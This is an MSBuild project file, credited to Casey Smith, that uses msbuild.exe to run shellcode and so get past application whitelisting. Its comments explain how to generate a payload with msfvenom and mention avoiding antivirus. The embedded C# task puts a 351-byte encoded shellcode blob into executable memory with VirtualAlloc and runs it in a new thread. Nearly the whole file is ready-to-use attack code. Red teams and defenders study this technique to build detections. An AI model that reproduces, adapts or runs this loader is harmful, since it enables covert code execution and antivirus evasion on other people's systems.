<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
	
	  <!-- Original author: The excellent Casey Smith, Twitter: @subTee -->
	  <!-- https://gist.github.com/caseysmithrc/dfb671a8fbe3fa3305cb1ca06c46a010 -->
	
  <!-- This executes shellcode via msbuild.exe (be careful of A.V products) -->
  <!-- To execute your own shellcode, you first need to generate one using MSFVENOM: -->
  <!--     msfvenom -p <payload to use>  -e <encoder (optional)>  -f ps1 (could also be done with csharp or powershell) -->
  <!-- Adapt the XML below with your shellcode and adapt payload's length in buffer allocation-->
  <!-- Execution: C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Shellcode.cs -->
	
  <!-- Payload generation tool: https://github.com/Mr-Un1k0d3r/PowerLessShell -->
	
  <Target Name="Shellcode Exec">
    <ClassPayloadExec />
  </Target>
  <UsingTask
    TaskName="ClassPayloadExec"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassPayloadExec :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
				UInt32 lpThreadAttributes,
				UInt32 dwStackSize,
				UInt32 lpStartAddress,
				IntPtr param,
				UInt32 dwCreationFlags,
				ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
				IntPtr hHandle,
				UInt32 dwMilliseconds
            );          
          public override bool Execute(){
			  
		// Adapt here buffer length + shellcode
		byte[] Sc = new byte[351] {0xb8,0xfe,0xb5,0xa1,0x4,0xdb,0xd5,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x52,0x31,0x43,0x12,0x83,0xc3,0x4,0x3,0xbd,0xbb,0x43,0xf1,0xbd,0x2c,0x1,0xfa,0x3d,0xad,0x66,0x72,0xd8,0x9c,0xa6,0xe0,0xa9,0x8f,0x16,0x62,0xff,0x23,0xdc,0x26,0xeb,0xb0,0x90,0xee,0x1c,0x70,0x1e,0xc9,0x13,0x81,0x33,0x29,0x32,0x1,0x4e,0x7e,0x94,0x38,0x81,0x73,0xd5,0x7d,0xfc,0x7e,0x87,0xd6,0x8a,0x2d,0x37,0x52,0xc6,0xed,0xbc,0x28,0xc6,0x75,0x21,0xf8,0xe9,0x54,0xf4,0x72,0xb0,0x76,0xf7,0x57,0xc8,0x3e,0xef,0xb4,0xf5,0x89,0x84,0xf,0x81,0xb,0x4c,0x5e,0x6a,0xa7,0xb1,0x6e,0x99,0xb9,0xf6,0x49,0x42,0xcc,0xe,0xaa,0xff,0xd7,0xd5,0xd0,0xdb,0x52,0xcd,0x73,0xaf,0xc5,0x29,0x85,0x7c,0x93,0xba,0x89,0xc9,0xd7,0xe4,0x8d,0xcc,0x34,0x9f,0xaa,0x45,0xbb,0x4f,0x3b,0x1d,0x98,0x4b,0x67,0xc5,0x81,0xca,0xcd,0xa8,0xbe,0xc,0xae,0x15,0x1b,0x47,0x43,0x41,0x16,0xa,0xc,0xa6,0x1b,0xb4,0xcc,0xa0,0x2c,0xc7,0xfe,0x6f,0x87,0x4f,0xb3,0xf8,0x1,0x88,0xb4,0xd2,0xf6,0x6,0x4b,0xdd,0x6,0xf,0x88,0x89,0x56,0x27,0x39,0xb2,0x3c,0xb7,0xc6,0x67,0x92,0xe7,0x68,0xd8,0x53,0x57,0xc9,0x88,0x3b,0xbd,0xc6,0xf7,0x5c,0xbe,0xc,0x90,0xf7,0x45,0xc7,0x2d,0xf9,0x31,0x5,0x3a,0x4,0xb9,0x29,0xea,0x81,0x5f,0x43,0x1a,0xc4,0xc8,0xfc,0x83,0x4d,0x82,0x9d,0x4c,0x58,0xef,0x9e,0xc7,0x6f,0x10,0x50,0x20,0x5,0x2,0x5,0xc0,0x50,0x78,0x80,0xdf,0x4e,0x14,0x4e,0x4d,0x15,0xe4,0x19,0x6e,0x82,0xb3,0x4e,0x40,0xdb,0x51,0x63,0xfb,0x75,0x47,0x7e,0x9d,0xbe,0xc3,0xa5,0x5e,0x40,0xca,0x28,0xda,0x66,0xdc,0xf4,0xe3,0x22,0x88,0xa8,0xb5,0xfc,0x66,0xf,0x6c,0x4f,0xd0,0xd9,0xc3,0x19,0xb4,0x9c,0x2f,0x9a,0xc2,0xa0,0x65,0x6c,0x2a,0x10,0xd0,0x29,0x55,0x9d,0xb4,0xbd,0x2e,0xc3,0x24,0x41,0xe5,0x47,0x54,0x8,0xa7,0xee,0xfd,0xd5,0x32,0xb3,0x63,0xe6,0xe9,0xf0,0x9d,0x65,0x1b,0x89,0x59,0x75,0x6e,0x8c,0x26,0x31,0x83,0xfc,0x37,0xd4,0xa3,0x53,0x37,0xfd};
		UInt32 funcAddr = VirtualAlloc(0, (UInt32)Sc.Length,
		MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		Marshal.Copy(Sc, 0, (IntPtr)(funcAddr), Sc.Length);
		IntPtr hThread = IntPtr.Zero;
		UInt32 threadId = 0;
		IntPtr pinfo = IntPtr.Zero;
		hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		WaitForSingleObject(hThread, 0xFFFFFFFF);
		return true;
          } 
        }     
      ]]> // close CDATA[]
      </Code>
    </Task>
  </UsingTask>
</Project>
